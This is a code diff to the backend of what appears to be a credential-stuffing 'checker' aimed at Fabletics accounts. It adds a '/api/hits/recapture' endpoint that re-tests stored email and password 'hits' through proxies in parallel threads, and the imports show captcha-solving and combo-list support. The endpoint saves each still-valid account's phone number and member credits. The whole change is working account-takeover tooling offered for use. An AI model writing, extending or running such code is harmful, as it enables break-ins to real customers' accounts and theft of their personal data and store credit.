@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
 from typing import Any
 
@@ -28,10 +29,13 @@ from .db import (
     get_session,
     init_db,
     list_hits,
+    list_hits_for_recapture,
     list_saved_combos,
     save_session,
+    upsert_hit,
 )
 from fabletics.captcha import get_capsolver_balance
+from fabletics.checker import check_account
 from fabletics.smoke_test import run_smoke_test
 
 from .worker import worker
@@ -276,6 +280,57 @@ async def remove_hits(body: DeleteHitsRequest) -> dict[str, int]:
 async def remove_all_hits() -> dict[str, int]:
     deleted = clear_hits()
     return {"deleted": deleted}
+
+
+@app.post("/api/hits/recapture")
+async def recapture_hits() -> dict[str, Any]:
+    if worker.is_running():
+        raise HTTPException(409, "Stop the job before recapturing hits")
+
+    hits = list_hits_for_recapture()
+    if not hits:
+        return {"ok": True, "total": 0, "updated": 0, "failed": 0, "results": []}
+
+    proxy_line = _first_proxy_line()
+    threads = min(5, max(1, len(hits)))
+
+    def recapture_one(hit: dict[str, Any]) -> dict[str, Any]:
+        email = hit["email"]
+        password = hit["password"]
+        result = check_account(email, password, proxy=proxy_line or None, timeout=45)
+        if result.status != "HIT":
+            return {
+                "id": hit["id"],
+                "email": email,
+                "ok": False,
+                "status": result.status,
+                "message": result.message,
+            }
+        line = result.format_hit()
+        upsert_hit(line, email, password, result.data)
+        return {
+            "id": hit["id"],
+            "email": email,
+            "ok": True,
+            "phone": result.data.get("phone"),
+            "member_credits": result.data.get("member_credits"),
+        }
+
+    results: list[dict[str, Any]] = []
+    with ThreadPoolExecutor(max_workers=threads) as pool:
+        futures = [pool.submit(recapture_one, hit) for hit in hits]
+        for future in as_completed(futures):
+            results.append(future.result())
+
+    updated = sum(1 for item in results if item.get("ok"))
+    failed = len(results) - updated
+    return {
+        "ok": failed == 0,
+        "total": len(hits),
+        "updated": updated,
+        "failed": failed,
+        "results": results,
+    }
 
 
 @app.get("/api/saved-combos")
